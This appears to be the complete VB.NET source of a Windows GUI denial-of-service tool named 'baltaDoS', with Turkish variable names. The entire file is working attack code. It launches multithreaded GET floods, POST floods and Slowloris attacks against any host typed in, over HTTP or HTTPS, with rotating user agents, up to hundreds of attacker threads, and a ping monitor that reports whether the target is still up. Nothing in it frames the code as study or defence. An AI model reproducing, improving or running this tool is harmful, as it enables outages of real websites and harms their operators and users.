Imports System.Net.Sockets
Imports System.IO
Imports System.Text
Imports System.Net
Imports System.Threading
Public Class baltaDoS
    Private thcoklu As System.Threading.Thread
    Private thping As System.Threading.Thread
    Private thdurdurucu As System.Threading.Thread
    Dim getArray As List(Of Threading.Thread) = New List(Of Threading.Thread)
    Dim postArray As List(Of Threading.Thread) = New List(Of Threading.Thread)
    Dim slowlorisArray As List(Of Threading.Thread) = New List(Of Threading.Thread)
    Private Sub threadget()
        Dim host As String
        Dim headerGET As String
        Dim buffer(1024) As Byte
        Dim miktar As Integer
        Dim son As String
        While True
            Try
                '
                If chkSSL.Checked = True Then
                    host = txtHost.Text
                    Dim soket As Socket = New Sockets.Socket(Sockets.AddressFamily.InterNetwork, Sockets.SocketType.Stream, Sockets.ProtocolType.Tcp)
                    soket.Connect(host, 443)

                    Dim stream As Security.SslStream = New Security.SslStream(New Sockets.NetworkStream(soket))
                    stream.AuthenticateAsClient(host)
                    '
                    Try
                        While True
                            Try
                                listboxUserAgent.SelectedIndex += 1
                            Catch ex As Exception
                                listboxUserAgent.SelectedIndex = 0
                            End Try
                            '

                            If txtCookies.Text = "" Then
                                headerGET = "GET " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & vbCrLf
                            Else
                                headerGET = "GET " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Cookies: " & txtCookies.Text & vbCrLf & vbCrLf
                            End If
                            stream.Write(Encoding.Default.GetBytes(headerGET), 0, headerGET.Length)
                            System.Threading.Thread.Sleep(50)

                            miktar = stream.Read(buffer, 0, buffer.Length)
                            son = Encoding.Default.GetString(buffer, 0, miktar)
                            txtIndirilen.Text += miktar / 1024
                            System.Threading.Thread.Sleep(50)
                            '
                        End While
                    Catch ex As Exception
                        soket.Dispose()
                    End Try
                Else
                    host = txtHost.Text
                    Dim soket As Socket = New Sockets.Socket(Sockets.AddressFamily.InterNetwork, Sockets.SocketType.Stream, Sockets.ProtocolType.Tcp)
                    soket.Connect(host, 80)

                    Dim stream As NetworkStream = New NetworkStream(soket)
                    '
                    Try
                        While True
                            Try
                                listboxUserAgent.SelectedIndex += 1
                            Catch ex As Exception
                                listboxUserAgent.SelectedIndex = 0
                            End Try
                            '
                            If txtCookies.Text = "" Then
                                headerGET = "GET " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & vbCrLf
                            Else
                                headerGET = "GET " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Cookies: " & txtCookies.Text & vbCrLf & vbCrLf
                            End If
                            stream.Write(Encoding.Default.GetBytes(headerGET), 0, headerGET.Length)
                            System.Threading.Thread.Sleep(50)

                            miktar = stream.Read(buffer, 0, buffer.Length)
                            son = Encoding.Default.GetString(buffer, 0, miktar)
                            System.Threading.Thread.Sleep(50)
                            txtIndirilen.Text += miktar / 1024
                            '
                        End While
                    Catch ex As Exception
                        soket.Dispose()
                    End Try
                End If
                '
            Catch ex As Exception

            End Try
        End While
        Me.Refresh()
    End Sub
    Private Sub threadpost()
        Dim host As String
        Dim headerPOST As String
        Dim buffer(1024) As Byte
        Dim miktar As Integer
        Dim son As String
        While True
            Try
                '
                If chkSSL.Checked = True Then
                    host = txtHost.Text
                    Dim soket As Socket = New Sockets.Socket(Sockets.AddressFamily.InterNetwork, Sockets.SocketType.Stream, Sockets.ProtocolType.Tcp)
                    soket.Connect(host, 443)

                    Dim stream As Security.SslStream = New Security.SslStream(New Sockets.NetworkStream(soket))
                    stream.AuthenticateAsClient(host)
                    '
                    Try
                        While True

                            Try
                                listboxUserAgent.SelectedIndex += 1
                            Catch ex As Exception
                                listboxUserAgent.SelectedIndex = 0
                            End Try
                            '
                            If txtCookies.Text = "" Then
                                headerPOST = "POST " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "Content-Length: " & txtData.Text.Length & vbCrLf & vbCrLf & txtData.Text & vbCrLf & vbCrLf
                            Else
                                headerPOST = "POST " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Cookies: " & txtCookies.Text & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "Content-Length: " & txtData.Text.Length & vbCrLf & vbCrLf & txtData.Text & vbCrLf & vbCrLf
                            End If
                            stream.Write(Encoding.Default.GetBytes(headerPOST), 0, headerPOST.Length)
                            System.Threading.Thread.Sleep(50)

                            miktar = stream.Read(buffer, 0, buffer.Length)
                            son = Encoding.Default.GetString(buffer, 0, miktar)

                            System.Threading.Thread.Sleep(50)
                            txtIndirilen.Text += miktar / 1024
                            '
                        End While
                    Catch ex As Exception
                        soket.Dispose()

                    End Try
                Else
                    host = txtHost.Text
                    Dim soket As Socket = New Sockets.Socket(Sockets.AddressFamily.InterNetwork, Sockets.SocketType.Stream, Sockets.ProtocolType.Tcp)
                    soket.Connect(host, 80)

                    Dim stream As NetworkStream = New NetworkStream(soket)
                    '
                    Try
                        While True

                            Try
                                listboxUserAgent.SelectedIndex += 1
                            Catch ex As Exception
                                listboxUserAgent.SelectedIndex = 0
                            End Try
                            '
                            If txtCookies.Text = "" Then
                                headerPOST = "POST " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "Content-Length: " & txtData.Text.Length & vbCrLf & vbCrLf & txtData.Text & vbCrLf & vbCrLf
                            Else
                                headerPOST = "POST " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: " & listboxUserAgent.SelectedItem & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Cookies: " & txtCookies.Text & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "Content-Length: " & txtData.Text.Length & vbCrLf & vbCrLf & txtData.Text & vbCrLf & vbCrLf
                            End If
                            stream.Write(Encoding.Default.GetBytes(headerPOST), 0, headerPOST.Length)
                            System.Threading.Thread.Sleep(50)

                            miktar = stream.Read(buffer, 0, buffer.Length)
                            son = Encoding.Default.GetString(buffer, 0, miktar)

                            System.Threading.Thread.Sleep(50)
                            txtIndirilen.Text += miktar / 1024
                            '
                        End While
                    Catch ex As Exception
                        soket.Dispose()

                    End Try
                End If
                '
            Catch ex As Exception

            End Try
        End While
        Me.Refresh()
    End Sub
    Private Sub threadslow()
        Dim host As String
        Dim slowarray As Integer = txtSlowSoket.Text
        Dim headerSLOW As String
        While True
            Try
                If chkSSL.Checked = True Then
                    host = txtHost.Text
                    Dim soket(slowarray) As Socket
                    Dim stream(slowarray) As Security.SslStream
                    For i = 1 To slowarray
                        soket(i) = New Sockets.Socket(Sockets.AddressFamily.InterNetwork, Sockets.SocketType.Stream, Sockets.ProtocolType.Tcp)
                        soket(i).Connect(host, 443)

                        stream(i) = New Security.SslStream(New Sockets.NetworkStream(soket(i)))
                        stream(i).AuthenticateAsClient(host)

                        If txtCookies.Text = "" Then
                            headerSLOW = "POST " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Connection: keep-alive" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "Content-Length: 10000" & vbCrLf & vbCrLf
                        Else
                            headerSLOW = "POST " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Connection: keep-alive" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Cookies: " & txtCookies.Text & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "Content-Length: 10000" & vbCrLf & vbCrLf
                        End If

                        stream(i).Write(Encoding.Default.GetBytes(headerSLOW), 0, headerSLOW.Length)
                        System.Threading.Thread.Sleep(1000 / slowarray)
                    Next

                    For i = 1 To 10000
                        For a = 1 To slowarray
                            Dim harf As String() = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "r", "s", "t", "u", "v", "y", "z"}
                            Randomize()
                            Dim data As String = harf(Rnd() * 22)
                            stream(a).Write(Encoding.Default.GetBytes(data), 0, data.Length)
                            System.Threading.Thread.Sleep(1000 / slowarray)
                        Next
                    Next
                Else
                    host = txtHost.Text
                    Dim soket(slowarray) As Socket
                    Dim stream(slowarray) As NetworkStream
                    For i = 1 To slowarray
                        soket(i) = New Sockets.Socket(Sockets.AddressFamily.InterNetwork, Sockets.SocketType.Stream, Sockets.ProtocolType.Tcp)
                        soket(i).Connect(host, 80)

                        stream(i) = New NetworkStream(soket(i))

                        If txtCookies.Text = "" Then
                            headerSLOW = "POST " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "Content-Length: 10000" & vbCrLf & vbCrLf
                        Else
                            headerSLOW = "POST " & txtURL.Text & " HTTP/1.1" & vbCrLf & "Host: " & txtHost.Text & vbCrLf & "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" & vbCrLf & "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" & vbCrLf & "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" & vbCrLf & "Accept-Encoding: gzip, deflate" & vbCrLf & "Referer: " & txtReferer.Text & vbCrLf & "Cookies: " & txtCookies.Text & vbCrLf & "Content-Type: application/x-www-form-urlencoded" & vbCrLf & "Content-Length: 10000" & vbCrLf & vbCrLf
                        End If
                        '
                        stream(i).Write(Encoding.Default.GetBytes(headerSLOW), 0, headerSLOW.Length)
                        '
                        System.Threading.Thread.Sleep(1000 / slowarray)
                    Next

                    For i = 1 To 10000
                        For a = 1 To slowarray
                            Dim harf As String() = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "r", "s", "t", "u", "v", "y", "z"}
                            Randomize()
                            Dim data As String = harf(Rnd() * 22)
                            stream(a).Write(Encoding.Default.GetBytes(data), 0, data.Length)
                            System.Threading.Thread.Sleep(1000 / slowarray)
                        Next
                    Next
                End If
                '
            Catch ex As Exception

            End Try
        End While
        Me.Refresh()
    End Sub
    Private Sub cokluthread()
        On Error Resume Next
        txtSaldirganlar.Text = 0
        Dim limit As Integer
        Dim saldirganlar As Integer
        Dim saldirgansay As Integer
        While True
            If listboxSaldiriYontemleri.Items.Contains("Get Flood") Then
                limit = txtSaldirganlimiti.Text
                saldirganlar = txtSaldirganlar.Text
                If limit > saldirganlar Then
                    saldirgansay = txtSaldirganlar.Text
                    Dim MyThread As New Threading.Thread(New Threading.ThreadStart(AddressOf threadget))
                    MyThread.Start()
                    getArray.Add(MyThread)
                    txtSaldirganlar.Text += 1
                    System.Threading.Thread.Sleep(1000 / txtSaldirganhiz.Text)
                Else
                    btnDur.Enabled = True
                End If
            End If
            If listboxSaldiriYontemleri.Items.Contains("Post Flood") Then
                limit = txtSaldirganlimiti.Text
                saldirganlar = txtSaldirganlar.Text
                If limit > saldirganlar Then
                    saldirgansay = txtSaldirganlar.Text
                    Dim MyThread As New Threading.Thread(New Threading.ThreadStart(AddressOf threadpost))
                    MyThread.Start()
                    postArray.Add(MyThread)
                    txtSaldirganlar.Text += 1
                    System.Threading.Thread.Sleep(1000 / txtSaldirganhiz.Text)
                Else
                    btnDur.Enabled = True
                End If
            End If
            If listboxSaldiriYontemleri.Items.Contains("Slowloris") Then
                limit = txtSaldirganlimiti.Text
                saldirganlar = txtSaldirganlar.Text
                If limit > saldirganlar Then
                    saldirgansay = txtSaldirganlar.Text
                    Dim MyThread As New Threading.Thread(New Threading.ThreadStart(AddressOf threadslow))
                    MyThread.Start()
                    slowlorisArray.Add(MyThread)
                    txtSaldirganlar.Text += 1
                    System.Threading.Thread.Sleep(1000 / txtSaldirganhiz.Text)
                Else
                    btnDur.Enabled = True
                End If
            End If
        End While
        Me.Refresh()
    End Sub
    Private Sub durdurucu()
        On Error Resume Next
        Dim Limit As Integer = txtSaldirganlimiti.Text
        For i = 0 To Limit
            getArray.Item(i).Abort()
            postArray.Item(i).Abort()
            slowlorisArray.Item(i).Abort()
            If i = Limit Then
                '
                If listboxSaldiriYontemleri.Items.Count = 1 Then
                    btnSil1.Visible = True
                ElseIf listboxSaldiriYontemleri.Items.Count = 2 Then
                    btnSil1.Visible = True
                    btnSil2.Visible = True
                ElseIf listboxSaldiriYontemleri.Items.Count = 3 Then
                    btnSil1.Visible = True
                    btnSil2.Visible = True
                    btnSil3.Visible = True
                End If
                '
                btnBasla.Enabled = True
                btnDosyaAc.Enabled = True
                listboxSaldiriYontemleri.Enabled = True
                txtHost.Enabled = True
                txtReferer.Enabled = True
                txtCookies.Enabled = True
                txtData.Enabled = True
                txtSlowSoket.Enabled = True
                txtSaldirganhiz.Enabled = True
                txtSaldirganlimiti.Enabled = True
                txtTimeout.Enabled = True
                txtURL.Enabled = True
                chkSSL.Enabled = True
                chkSSL.BackColor = Color.Black
                getArray.Clear()
                postArray.Clear()
                slowlorisArray.Clear()
                thdurdurucu.Abort()
            End If
            System.Threading.Thread.Sleep(1)
            txtSaldirganlar.Text -= 1
        Next
    End Sub
    Private Sub pinghttp()
        While True
            Try
                System.Threading.Thread.Sleep(txtTimeout.Text)
                If My.Computer.Network.Ping(txtHost.Text, txtTimeout.Text) Then
                    Panel1.BackColor = Color.LimeGreen
                Else
                    Panel1.BackColor = Color.Red
                End If
            Catch ex As Exception
                Panel1.BackColor = Color.Red
            End Try
        End While
        Me.Refresh()
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles btnDosyaAc.Click
        On Error Resume Next
        OpenFileDialog1.ShowDialog()
    End Sub

    Private Sub OpenFileDialog1_FileOk(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles OpenFileDialog1.FileOk
        On Error Resume Next
        txtYontemOku.Text = System.IO.File.ReadAllText(OpenFileDialog1.FileName, System.Text.Encoding.Default)
        txtSaldiriYontemleri.Text = listboxSaldiriYontemleri.Items.Count
        txt_Durum_SaldiriYontemleri.Text = listboxSaldiriYontemleri.Items.Count
        listboxSaldiriYontemleri.SelectedIndex = listboxSaldiriYontemleri.Items.Count - 1
        If txtSaldiriYontemleri.Text = 1 Then
            btnSil1.Visible = True
        ElseIf txtSaldiriYontemleri.Text = 2 Then
            btnSil2.Visible = True
        ElseIf txtSaldiriYontemleri.Text = 3 Then
            btnSil3.Visible = True
        End If
    End Sub
    Private Sub RichTextBox2_TextChanged(sender As Object, e As EventArgs) Handles txtYontemOku.TextChanged
        On Error Resume Next
        If txtYontemOku.Text = "662b0571ac5e530edebde9fa163adc15" Then
            If listboxSaldiriYontemleri.Items.Contains("Get Flood") Then
                MsgBox("Get Flood Yöntemi Zaten Mevcut", MsgBoxStyle.Critical, "Hata")
            Else
                listboxSaldiriYontemleri.Items.Add("Get Flood")
                My.Computer.Audio.Play(My.Resources.correct, AudioPlayMode.Background)
            End If
        End If
        If txtYontemOku.Text = "0a8459aa738b0a4faa05b8ef091810f4" Then
            If listboxSaldiriYontemleri.Items.Contains("Post Flood") Then
                MsgBox("Post Flood Yöntemi Zaten Mevcut", MsgBoxStyle.Critical, "Hata")
            Else
                listboxSaldiriYontemleri.Items.Add("Post Flood")
                My.Computer.Audio.Play(My.Resources.correct, AudioPlayMode.Background)
            End If
        End If
        If txtYontemOku.Text = "732798a292ccd22394a13db3a2ab3480" Then
            If listboxSaldiriYontemleri.Items.Contains("Slowloris") Then
                MsgBox("Slowloris Yöntemi Zaten Mevcut", MsgBoxStyle.Critical, "Hata")
            Else
                listboxSaldiriYontemleri.Items.Add("Slowloris")
                My.Computer.Audio.Play(My.Resources.correct, AudioPlayMode.Background)
            End If
        End If
    End Sub

    Private Sub btnBasla_Click(sender As Object, e As EventArgs) Handles btnBasla.Click
        On Error Resume Next
        If listboxSaldiriYontemleri.Items.Count = 0 Then
            MsgBox("Lütfen Bir Saldırı Yöntemi Seçiniz", MsgBoxStyle.Critical, "Hata")
            txtHatasay.Text += 1
        End If
        If txtHost.Text = "www.example.com" Then
            MsgBox("Lütfen Düzgün Bir Host Adresi Yazınız", MsgBoxStyle.Critical, "Hata")
            txtHatasay.Text += 1
        End If
        If txtHatasay.Text = 0 Then
            btnBasla.Enabled = False
            btnSil1.Visible = False
            btnSil2.Visible = False
            btnSil3.Visible = False
            btnDosyaAc.Enabled = False
            listboxSaldiriYontemleri.Enabled = False
            txtHost.Enabled = False
            txtReferer.Enabled = False
            txtCookies.Enabled = False
            txtData.Enabled = False
            txtURL.Enabled = False
            txtSlowSoket.Enabled = False
            txtSaldirganhiz.Enabled = False
            txtSaldirganlimiti.Enabled = False
            txtTimeout.Enabled = False
            chkSSL.Enabled = False
            chkSSL.BackColor = Color.Gray
            Panel1.BackColor = Color.Gray

            txtSaldirganlar.Text = 0
            txtIndirilen.Text = 0
            txtReceive.Text = ""
            thcoklu = New System.Threading.Thread(AddressOf cokluthread)
            thcoklu.Start()
            thping = New System.Threading.Thread(AddressOf pinghttp)
            thping.Start()
        End If
        txtHatasay.Text = 0
    End Sub

    Private Sub txtHost_TextChanged(sender As Object, e As EventArgs) Handles txtHost.TextChanged
        On Error Resume Next
        If chkSSL.Checked = True Then
            txtReferer.Text = "https://" & txtHost.Text & txtURL.Text
            txtHedefSite.Text = "https://" & txtHost.Text & txtURL.Text
        ElseIf chkSSL.Checked = False Then
            txtReferer.Text = "http://" & txtHost.Text & txtURL.Text
            txtHedefSite.Text = "http://" & txtHost.Text & txtURL.Text
        End If
        If InStr(txtHost.Text, "https://") Then
            txtHost.Text = txtHost.Text.Replace("https://", "")
            Timer1.Start()
        ElseIf InStr(txtHost.Text, "http://") Then
            txtHost.Text = txtHost.Text.Replace("http://", "")
            Timer2.Start()
        End If
        Dim ayir As String = InStr(txtHost.Text, "/")
        If ayir > 0 Then
            txtURL.Text = "/" & txtHost.Text.Substring(ayir)
        End If
        Dim s As String = txtHost.Text
        txtHost.Text = s.Substring(0, s.IndexOf("/"))
    End Sub

    Private Sub chkSSL_CheckedChanged(sender As Object, e As EventArgs) Handles chkSSL.CheckedChanged
        On Error Resume Next
        If chkSSL.Checked = True Then
            txtReferer.Text = "https://" & txtHost.Text & txtURL.Text
            txtHedefSite.Text = "https://" & txtHost.Text & txtURL.Text
        ElseIf chkSSL.Checked = False Then
            txtReferer.Text = "http://" & txtHost.Text & txtURL.Text
            txtHedefSite.Text = "http://" & txtHost.Text & txtURL.Text
        End If
    End Sub

    Private Sub txtURL_TextChanged(sender As Object, e As EventArgs) Handles txtURL.TextChanged
        On Error Resume Next
        If txtURL.Text = "" Then
            txtURL.Text = "/"
        End If
        If chkSSL.Checked = True Then
            txtReferer.Text = "https://" & txtHost.Text & txtURL.Text
            txtHedefSite.Text = "https://" & txtHost.Text & txtURL.Text
        ElseIf chkSSL.Checked = False Then
            txtReferer.Text = "http://" & txtHost.Text & txtURL.Text
            txtHedefSite.Text = "http://" & txtHost.Text & txtURL.Text
        End If
    End Sub
    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next
        CheckForIllegalCrossThreadCalls = False
        Dim saldirganhiz As Integer = 1000
        Dim saldirganlimiti As Integer = 500
        Dim slowsoket As Integer = 5
        Dim timeout As Integer = 5000
        Dim maxslowsoket As Integer = slowsoket * saldirganlimiti
        Dim saldiriyontemleri As Integer = 0
        Dim saldirganlar As Integer = 0
        Dim indirilen As Integer = 0
        Dim durumsaldiriyontemleri As Integer = 0
        Dim hatasay As Integer = 0
        txtSaldirganhiz.Text = saldirganhiz
        txtSaldirganlimiti.Text = saldirganlimiti
        txtSlowSoket.Text = slowsoket
        txtTimeout.Text = timeout
        txtSaldiriYontemleri.Text = saldiriyontemleri
        txtSaldirganlar.Text = saldirganlar
        txtIndirilen.Text = indirilen
        txt_Durum_SaldiriYontemleri.Text = durumsaldiriyontemleri
        txtMaxSlowSoket.Text = maxslowsoket
        txtHatasay.Text = hatasay
        listboxUserAgent.SelectedIndex = 0
    End Sub

    Private Sub btnDur_Click(sender As Object, e As EventArgs) Handles btnDur.Click
        On Error Resume Next
        btnDur.Enabled = False
        thcoklu.Abort()
        thping.Abort()
        thdurdurucu = New System.Threading.Thread(AddressOf durdurucu)
        thdurdurucu.Start()
    End Sub

    Private Sub ListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles listboxSaldiriYontemleri.SelectedIndexChanged
        On Error Resume Next
        If listboxSaldiriYontemleri.SelectedItem = "Slowloris" Then
            Label7.Visible = False
            Header.Visible = True
            txtUyari.Visible = False
            txtData.Visible = False
            txtMaxSlowSoket.Visible = True
            Label13.Visible = True
            txtSlowSoket.Visible = True
            Label2.Visible = True
            txtCookies.Height = 155
            Header.Text = "Slowloris Header Ayarları"
        ElseIf listboxSaldiriYontemleri.SelectedItem = "Get Flood" Then
            Label7.Visible = False
            Header.Visible = True
            txtUyari.Visible = False
            txtData.Visible = False
            txtSlowSoket.Visible = False
            Label2.Visible = False
            txtCookies.Height = 155
            Header.Text = "Get Header Ayarları"
        ElseIf listboxSaldiriYontemleri.SelectedItem = "Post Flood" Then
            Label7.Visible = True
            Header.Visible = True
            txtUyari.Visible = False
            txtData.Visible = True
            txtSlowSoket.Visible = False
            Label2.Visible = False
            txtCookies.Height = 75
            Header.Text = "Post Header Ayarları"
        End If
        '
        If listboxSaldiriYontemleri.Items.Contains("Slowloris") Then
        Else
            txtMaxSlowSoket.Visible = False
            Label13.Visible = False
        End If
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles btnSil1.Click
        On Error Resume Next
        If txtSaldiriYontemleri.Text = 3 Then
            btnSil3.Visible = False
        ElseIf txtSaldiriYontemleri.Text = 2 Then
            btnSil2.Visible = False
        ElseIf txtSaldiriYontemleri.Text = 1 Then
            btnSil1.Visible = False
            Header.Visible = False
            txtUyari.Visible = True
        End If
        listboxSaldiriYontemleri.Items.RemoveAt(0)
        txt_Durum_SaldiriYontemleri.Text -= 1
        txtSaldiriYontemleri.Text -= 1
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles btnSil2.Click
        On Error Resume Next
        If txtSaldiriYontemleri.Text = 3 Then
            btnSil3.Visible = False
        ElseIf txtSaldiriYontemleri.Text = 2 Then
            btnSil2.Visible = False
        ElseIf txtSaldiriYontemleri.Text = 1 Then
            btnSil1.Visible = False
            Header.Visible = False
            txtUyari.Visible = True
        End If
        listboxSaldiriYontemleri.Items.RemoveAt(1)
        txt_Durum_SaldiriYontemleri.Text -= 1
        txtSaldiriYontemleri.Text -= 1
    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles btnSil3.Click
        On Error Resume Next
        If txtSaldiriYontemleri.Text = 3 Then
            btnSil3.Visible = False
        ElseIf txtSaldiriYontemleri.Text = 2 Then
            btnSil2.Visible = False
        ElseIf txtSaldiriYontemleri.Text = 1 Then
            btnSil1.Visible = False
            Header.Visible = False
            txtUyari.Visible = True
        End If
        listboxSaldiriYontemleri.Items.RemoveAt(2)
        txt_Durum_SaldiriYontemleri.Text -= 1
        txtSaldiriYontemleri.Text -= 1
    End Sub

    Private Sub txtSaldirganlimiti_TextChanged(sender As Object, e As EventArgs) Handles txtSaldirganlimiti.TextChanged
        On Error Resume Next
        txtMaxSlowSoket.Text = txtSaldirganlimiti.Text * txtSlowSoket.Text
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles txtSlowSoket.TextChanged
        On Error Resume Next
        txtMaxSlowSoket.Text = txtSaldirganlimiti.Text * txtSlowSoket.Text
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        On Error Resume Next
        chkSSL.Checked = True
        Timer1.Stop()
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        On Error Resume Next
        chkSSL.Checked = False
        Timer2.Stop()
    End Sub

    Private Sub txtSaldiriYontemleri_TextChanged(sender As Object, e As EventArgs) Handles txtSaldiriYontemleri.TextChanged
        On Error Resume Next
        '
        If listboxSaldiriYontemleri.Items.Contains("Slowloris") Then
        Else
            Label2.Visible = False
            txtSlowSoket.Visible = False
        End If
        '
    End Sub
End Class
